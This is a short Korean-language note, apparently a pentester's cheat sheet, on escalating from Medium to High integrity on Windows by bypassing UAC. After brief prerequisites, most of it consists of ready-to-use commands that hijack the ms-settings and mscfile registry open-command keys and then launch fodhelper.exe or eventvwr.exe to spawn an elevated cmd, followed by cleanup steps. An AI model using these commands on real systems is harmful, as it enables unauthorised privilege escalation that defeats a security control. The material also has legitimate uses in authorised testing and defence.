UAC는 관리자 계정도 기본적으로 Medium 무결성에서 실행시킨다 = 관리자 계정으로 로그인 해도 기본적으로 일반 권한으로 실행

원격 쉘에서는 UAC 프롬프트를 클릭할 수 없으므로 프로그래밍적 우회가 필요하다

**사용 조건:**

```css
1.현재 사용자가 Administrators 그룹 소속
2.whoami /groups에서 Mandatory Label\Medium 확인
```

**공격 흐름 + 명령어:**

```sql
(공격 흐름)

1.whoami /groups에서 Medium 무결성 확인
2.fodhelper 우회 시도
3.High 무결성 프로세스에서 명령 실행

--------------------------------------------------------------

(fodhelper.exe 우회 — 가장 신뢰성 높음)

reg add HKCU\Software\Classes\ms-settings\shell\open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f
fodhelper.exe
# → High 무결성 cmd 생성!

# 정리
reg delete HKCU\Software\Classes\ms-settings /f

--------------------------------------------------------------

(eventvwr.exe 우회)

reg add HKCU\Software\Classes\mscfile\shell\open\command /d "cmd.exe" /f
eventvwr.exe
reg delete HKCU\Software\Classes\mscfile /f
```
